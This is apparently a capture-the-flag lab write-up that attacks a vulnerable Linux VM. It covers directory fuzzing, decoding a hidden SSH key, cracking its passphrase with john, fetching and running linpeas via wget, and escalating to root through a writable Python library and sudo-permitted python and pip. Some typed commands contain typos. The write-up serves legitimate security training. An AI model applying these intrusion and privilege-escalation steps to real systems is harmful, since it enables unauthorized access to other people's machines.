# Summary
- Reconnaisence
- Exploitation
- Escalation

# Reconnaisence 
First of all, identifying the target is the most important thing to do first. I use this command to find the target:
```
sudo netdiscover -i eth0
```

<img width="609" height="256" alt="Screenshot 2025-09-18 225412" src="https://github.com/user-attachments/assets/8710e729-62c6-4044-a663-89604c6d2dfa" />

Base on the Hostname, I deduct that `192.168.0.155`  is the ip of the target. So I start the scanning session with `nmap`
```
nmap -T4 -sV -vv -O -A {ip}
```

<img width="625" height="438" alt="Screenshot 2025-09-18 230924" src="https://github.com/user-attachments/assets/12b6104d-9231-40fd-95a8-5622a583497a" />
<img width="629" height="399" alt="Screenshot 2025-09-18 230940" src="https://github.com/user-attachments/assets/c841d4fd-3a51-4fef-877e-ebea15d8ad7c" />

There are 2 open ports:
- 80/tcp
- 22/tcp

  Accessing the target via port 80
  
<img width="1918" height="873" alt="Screenshot 2025-09-18 233343" src="https://github.com/user-attachments/assets/9a22b751-6215-4c7f-9efa-09a3511d8fcc" />
<img width="1639" height="507" alt="Screenshot 2025-09-18 233432" src="https://github.com/user-attachments/assets/22781a5d-ddad-40a4-bb5d-220b551971d9" />

I need to fuzz the directory using `gobuster` to find hidden folders in the server by this following command:
```
gobuster dir -w /usr/share/wordlists/dirb/
```
<img width="780" height="371" alt="Screenshot 2025-09-18 233934" src="https://github.com/user-attachments/assets/a4161537-8159-46b4-9db6-2592de336560" />

It contains `robots.txt` file as well, so accessing that file to further gather more information about the system

<img width="1117" height="146" alt="Screenshot 2025-09-18 234026" src="https://github.com/user-attachments/assets/806f692f-0e81-456e-a9a6-35a81712195a" />

I am a bit clueless here, so I try to use lua-script scan vulnerability to find vulnerabilities

```
nmap --script=vuln {ip}
```

<img width="691" height="308" alt="Screenshot 2025-09-18 235444" src="https://github.com/user-attachments/assets/a12c9c7d-3ef8-4c4c-8668-410c56a3cfa3" />

Further dive into `manual` folder to find more interesting files and here are some potential folders

<img width="787" height="246" alt="Screenshot 2025-09-19 000038" src="https://github.com/user-attachments/assets/1f68605c-139d-4c3a-b7d0-069a12b56071" />

`/da`,`/de`, `/en`, and the remain directories inside `/manual` folder will generate the same results. This is a sample list but all of them generated the same things.

<img width="795" height="197" alt="Screenshot 2025-09-19 000308" src="https://github.com/user-attachments/assets/48163bcf-017b-4f48-beab-6f18455810af" />

Remember in the robots.txt file indicate a folder called `/~myfiles` which I haven't touch yet

<img width="1222" height="300" alt="Screenshot 2025-09-19 005138" src="https://github.com/user-attachments/assets/be2cef8b-c947-465a-86d2-51db9cc8de4d" />

So, there are some potential files in this folder which needs `gobuster` to scan.

```
gobuster dir -w /usr/share/wordlists/dirb/big.txt -u 'http://{ip}/~myfiles/'
```
This one showed nothing so I try another worlist
```
/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```
And still nothing appear. What should I do now? Even `enum4linux` return nothing special.

<img width="992" height="487" alt="Screenshot 2025-09-19 010122" src="https://github.com/user-attachments/assets/bff1414d-d099-47c4-8376-37d831f60800" />

I try using `ffuf` to see that what if this tool would generate a different things by this command
```
ffuf -c -w /usr/shre/wordlists/dirbuster/directory-list-2.3-medium.txt'-u 'http://{ip}/FUZZ'
```

And received nothing at all. So I attempt to do different what if the fuzzing parameter look like this `~FUZZ` similar to the format of `~myfile`. Improve the command:

```
ffuf -c -w /usr/shre/wordlists/dirbuster/directory-list-2.3-medium.txt -u 'http://{ip}/~FUZZ'
```
and yes the theory was right. I get another folder called `~secret`

<img width="867" height="418" alt="Screenshot 2025-09-19 011324" src="https://github.com/user-attachments/assets/89596b37-2bcb-4b4b-bfdb-e73d00b2cd97" />

Another hint for me? So I have to further enumerate files inside this folder


<img width="1260" height="292" alt="Screenshot 2025-09-19 011450" src="https://github.com/user-attachments/assets/72ada29e-5dd5-445e-bd61-c61542cecfa2" />

I guess that I need to fuzz this folder further to get what `icex64` called ssh private key. The command for this:
```
ffuf -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 'http://{ip}/~secret/.FUZZ' 
```
And here I go, a little file right there
<img width="815" height="18" alt="Screenshot 2025-09-19 125609" src="https://github.com/user-attachments/assets/9d859cb1-dfcb-4be4-8428-be9068986e1c" />

Let's access it. NOTE: the file is called `.mysecret.txt` which has a dot in front unlike normal file.

<img width="1912" height="372" alt="Screenshot 2025-09-19 125839" src="https://github.com/user-attachments/assets/e17f6c84-140c-4261-9e67-0d43a87bf41c" />

I need to identify which algorithm is this so usind `dcode.fr` cipher identifier to indicate exactly what it is

<img width="795" height="263" alt="Screenshot 2025-09-19 130359" src="https://github.com/user-attachments/assets/34de314e-d6ff-44e9-8d52-f056da069d53" />

The result show that it is most likelike  Base 58. Then using cyberchef to decrypt this under Base 58. And yeah that is the ssh private key and I reckon that the username should be `icex64`

<img width="1529" height="754" alt="Screenshot 2025-09-19 131121" src="https://github.com/user-attachments/assets/c9e7c06f-6d9d-4466-921f-98e3b60d045d" />

Using this command to set up the key correctly

```
nano key
```
copy and paste the key from Output in cyberchef, then granting right permission
```
chmod 600 key
```
One more thing required to do in order to initialize the connection is finding the passphrase. And using `john` to achieve that:
Convert the format of key into hash for john to crack, then using `/usr/share/wordlists/fasttrack.txt` to do
```
ssh2john key > keyhash
john keyhash -w /usr/share/wordlists/fassttack.txt
```

<img width="930" height="206" alt="Screenshot 2025-09-19 132701" src="https://github.com/user-attachments/assets/ad8eebf0-31b0-45ee-a244-6e295025d83a" />

then initializing the connection via this command

```
ssh -i key icex64@{ip}
```

<img width="718" height="197" alt="Screenshot 2025-09-19 134902" src="https://github.com/user-attachments/assets/6fb0d9c1-07dc-4386-90ba-a431168a2b1f" />

I got the user flag which means that it's time for escalation

<img width="709" height="595" alt="Screenshot 2025-09-19 135116" src="https://github.com/user-attachments/assets/f245b6d4-a1f4-447f-8fe7-7413d65b16ce" />

# Escalation

## Arsene

While browsing the target server, I see that there are two files inside `/arsene` folder which is interesting enough to set foot in.

<img width="849" height="420" alt="Screenshot 2025-09-19 135734" src="https://github.com/user-attachments/assets/aed3a148-dd67-4d4b-b3d5-205d019032c2" />

There is a domain called `empirecybersecurity.co.mz` which might associate with the target but nothing happen
I think that I should import linpeas for further scanning the server (I already knew that this server run Linux in the Nmap scanning section above, that is why I choose to use linpeas)
Set up a listener, and remember change directory to direction containing linpeas
```
python3 -m http.server 9001
```
On the remote server
```
wget http://{ip}:9001/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```
<img width="1307" height="221" alt="Screenshot 2025-09-19 140955" src="https://github.com/user-attachments/assets/825e85d4-27ee-4315-8545-31e5932ae837" />

Here are the results:

<img width="299" height="226" alt="Screenshot 2025-09-19 141630" src="https://github.com/user-attachments/assets/572acc53-22cf-46bb-a083-aa8b477c9eb1" />
<img width="493" height="456" alt="Screenshot 2025-09-19 141524" src="https://github.com/user-attachments/assets/ea93f466-0397-4a13-b091-de00792979e1" />

If I had the ability to write on this python file which means that I can use python to spawn an executable bash under user `arsene` 
```
nano /usr/lib/python3.9/webbrowser.py
```

<img width="1275" height="224" alt="Screenshot 2025-09-19 142527" src="https://github.com/user-attachments/assets/d9dce581-5243-4de2-9207-ac48392b79b7" />

After add that line of code into the `webbrowser.py`, I need to use python3.9 to run the `heist.py` file in order to spawn a `arsene` bash. Now check sudo permissions for `icex64`

<img width="886" height="98" alt="Screenshot 2025-09-19 143216" src="https://github.com/user-attachments/assets/c33b82c7-2dc5-4ea5-8c27-2ab0b21b7344" />

For `/usr/bin/python3.9` to execute `/home/arsene/heist.py` does not require password which is what I want since I do not have the password for `icex64`
```
sudo -u /usr/bin/python3.9 /home/arsene/heist.py
```

<img width="1110" height="82" alt="Screenshot 2025-09-19 144135" src="https://github.com/user-attachments/assets/3e625140-810a-4bb9-ae92-ac96ef8a23f3" />

Now I'm disguished as `arsene`. Checking sudo permissions for this user since I do not obtain the password for this user either the same with `icex64`

<img width="902" height="98" alt="Screenshot 2025-09-19 144437" src="https://github.com/user-attachments/assets/9dd0826c-d030-4405-bdce-d6089c4634b4" />

For binary exploitation, I would use the site called `GTFObins` to find information about `usr/bin/pip`. TLDR: this command run without password -> exploit easier

<img width="864" height="212" alt="Screenshot 2025-09-19 144717" src="https://github.com/user-attachments/assets/78339b57-8a55-490f-90f3-5ca317c23c57" />

## Root 
<img width="932" height="99" alt="Screenshot 2025-09-19 144853" src="https://github.com/user-attachments/assets/9aadf346-b02f-46c0-9bc1-da32f9411fa5" />
<img width="811" height="743" alt="Screenshot 2025-09-19 144931" src="https://github.com/user-attachments/assets/cd317434-5ca8-4e8c-8673-f30ff93721bc" />

COMPLETED!!!! Happy hacking~~~
